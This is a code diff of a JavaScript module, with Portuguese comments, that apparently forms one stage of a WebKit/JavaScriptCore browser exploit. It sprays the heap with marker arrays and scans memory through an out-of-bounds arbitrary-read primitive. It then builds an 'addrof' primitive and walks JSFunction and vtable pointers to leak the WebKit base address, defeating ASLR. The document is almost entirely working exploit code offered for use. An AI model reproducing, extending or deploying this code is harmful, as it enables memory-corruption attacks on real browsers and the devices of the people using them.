@@ -1,7 +1,7 @@
 // js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43s - Final Strategy: Spray, Scan, Pwn)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs'; // Importa a função de utils
+import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
@@ -14,20 +14,19 @@ import { JSC_OFFSETS } from '../config.mjs';
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";
 
-// -- Constantes para a nova estratégia --
-const SPRAY_COUNT = 0x4000;
-const SPRAY_MARKER_A = 0x41414141; 
-const SPRAY_MARKER_B = 0x42424242;
-const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); 
-const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8D000000);   // Scan 48MB para mais chances
-const SCAN_STEP = 0x1000; 
+const SPRAY_COUNT = 0x4000; 
+const MARKER_A = 0x41414141; 
+const MARKER_B = 0x42424242;
+const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000);
+const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8D000000);   
+const SCAN_STEP = 0x1000;
 
 let spray_array = [];
 let addrof = null;
 
 function isValidPointer(ptr) {
     if (!isAdvancedInt64Object(ptr)) return false;
-    if (ptr.high() === 0) return false; 
+    if (ptr.high() === 0) return false;
     return true;
 }
 
@@ -39,7 +38,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let final_result = {
         errorOccurred: null,
         heap_scan: { success: false, msg: "Not run.", found_addr: null },
-        addrof_setup: { success: false, msg: "Not run."},
+        addrof_setup: { success: false, msg: "Not run." },
         webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
     };
 
@@ -53,13 +52,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- FASE 1: HEAP SPRAY ---
         logS3(`  --- Fase 1 (R43s): Pulverizando a Heap com ${SPRAY_COUNT} Arrays... ---`, "subtest");
-        spray_array = []; 
+        spray_array = [];
+        const addrof_target = { a: 0x41414141, b: 0x42424242 };
         for (let i = 0; i < SPRAY_COUNT; i++) {
             let arr = new Array(4);
-            arr[0] = SPRAY_MARKER_A;
-            arr[1] = SPRAY_MARKER_B;
-            arr[2] = i; // Índice para identificação
-            arr[3] = {a: 1, b: 2}; // Objeto placeholder
+            arr[0] = MARKER_A;
+            arr[1] = MARKER_B;
+            arr[2] = i; 
+            arr[3] = addrof_target;
             spray_array.push(arr);
         }
         logS3(`  Heap Spray concluído.`, "good");
@@ -70,28 +70,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         let found_butterfly_addr = null;
         let found_array_idx = -1;
 
-        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS.low(), SCAN_HEAP_START_ADDRESS.high());
+        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS);
              advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS);
              addr = addr.add(SCAN_STEP)) {
             
             try {
                 const val = await arb_read(addr, 8);
-                // JSValues são "boxed". Um inteiro como 0x41414141 será 0x0000000141414141 ou similar.
-                // A forma mais robusta de encontrar o marcador é procurar pelo padrão de bytes.
-                // Vamos simplificar e procurar pelo low-part.
-                if (isAdvancedInt64Object(val) && val.low() === SPRAY_MARKER_A) {
+                if (isAdvancedInt64Object(val) && val.low() === MARKER_A) {
                     const next_val = await arb_read(addr.add(8), 8);
-                    if (isAdvancedInt64Object(next_val) && next_val.low() === SPRAY_MARKER_B) {
-                        const idx_val = (await arb_read(addr.add(16), 8)).low();
+                    if (isAdvancedInt64Object(next_val) && next_val.low() === MARKER_B) {
                         found_butterfly_addr = addr;
-                        found_array_idx = idx_val;
+                        found_array_idx = (await arb_read(addr.add(16), 8)).low();
                         final_result.heap_scan.success = true;
                         final_result.heap_scan.msg = `Encontrado butterfly do spray[${found_array_idx}] em ${found_butterfly_addr.toString(true)}`;
                         logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
                         break;
                     }
                 }
-            } catch (e) { /* Ignora erros de leitura de páginas inválidas */ }
+            } catch (e) { /* Ignora */ }
         }
         if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
         
@@ -99,17 +95,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`  --- Fase 3 (R43s): Construindo primitiva addrof ---`, "subtest");
         
         const found_array = spray_array[found_array_idx];
-        const obj_in_spray_addr = await arb_read(found_butterfly_addr.add(3 * 8), 8); // Lê o ponteiro para o objeto no índice 3
-        if (!isValidPointer(obj_in_spray_addr)) throw new Error("Ponteiro para o objeto alvo no butterfly é inválido.");
+        const sprayed_obj_addr = await arb_read(found_butterfly_addr.add(3 * 8), 8); 
+        if (!isValidPointer(sprayed_obj_addr)) throw new Error("Ponteiro para o objeto alvo no butterfly é inválido.");
 
         let addrof_map = new Map();
-        addrof_map.set(found_array[3], obj_in_spray_addr);
+        addrof_map.set(addrof_target, sprayed_obj_addr);
 
         addrof = (obj) => {
             if (addrof_map.has(obj)) return addrof_map.get(obj);
-            // Substitui o objeto no array e lê seu novo ponteiro do butterfly
             found_array[3] = obj;
-            return arb_read(found_butterfly_addr.add(3*8), 8);
+            return arb_read(found_butterfly_addr.add(3 * 8), 8);
         };
         final_result.addrof_setup.success = true;
         final_result.addrof_setup.msg = "Primitiva addrof funcional construída com sucesso.";
@@ -120,7 +115,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`  --- Fase 4 (R43s): Vazamento da Base do WebKit ---`, "subtest");
         const funcToLeak = () => {}; 
         const func_addr = await addrof(funcToLeak);
-        if (!func_addr) throw new Error("Falha ao obter endereço da função alvo com a nova primitiva addrof.");
+        if (!func_addr || !isValidPointer(func_addr)) throw new Error("Falha ao obter endereço da função alvo com a nova primitiva addrof.");
         logS3(`[WebKitLeak] Endereço da função alvo: ${func_addr.toString(true)}`, "leak");
 
         const executable_addr = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
@@ -132,10 +127,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const vtable_ptr = await arb_read(class_info_addr, 8);
         if (!isValidPointer(vtable_ptr)) throw new Error(`Ponteiro para vtable inválido: ${vtable_ptr.toString(true)}`);
         
-        final_result.webkit_leak.vtable_ptr = vtable_ptr.toString(true);
-        logS3(`[WebKitLeak] Ponteiro para vtable: ${final_result.webkit_leak.vtable_ptr}`, "leak");
+        logS3(`[WebKitLeak] Ponteiro para vtable: ${vtable_ptr.toString(true)}`, "leak");
         
-        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF); // 1MB alignment
+        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF);
         const webkit_base = vtable_ptr.and(page_mask);
         
         final_result.webkit_leak.webkit_base = webkit_base.toString(true);
